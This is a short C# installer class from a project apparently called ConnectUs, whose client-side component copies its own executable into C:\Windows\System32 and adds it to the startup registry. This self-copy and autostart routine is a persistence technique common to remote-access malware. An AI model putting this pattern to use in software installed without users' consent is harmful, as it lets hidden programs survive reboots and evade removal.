using System.IO;

namespace ConnectUs.Core.ClientSide
{
    public class Installer : IInstaller
    {
        private const string RootPath = @"C:\Windows\System32\";

        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;

        public Installer(IEnvironment environment, IFileService fileService, IRegistry registry)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
        }

        public bool IsInstalled
        {
            get { return _environment.ApplicationPath.Contains(RootPath); }
        }

        public string Install()
        {
            var fileName = Path.GetFileName(_environment.ApplicationPath);
            var targetFilePath = Path.Combine(RootPath, fileName);

            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);

            return targetFilePath;
        }
        public void Uninstall()
        {
            _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
        }
    }
}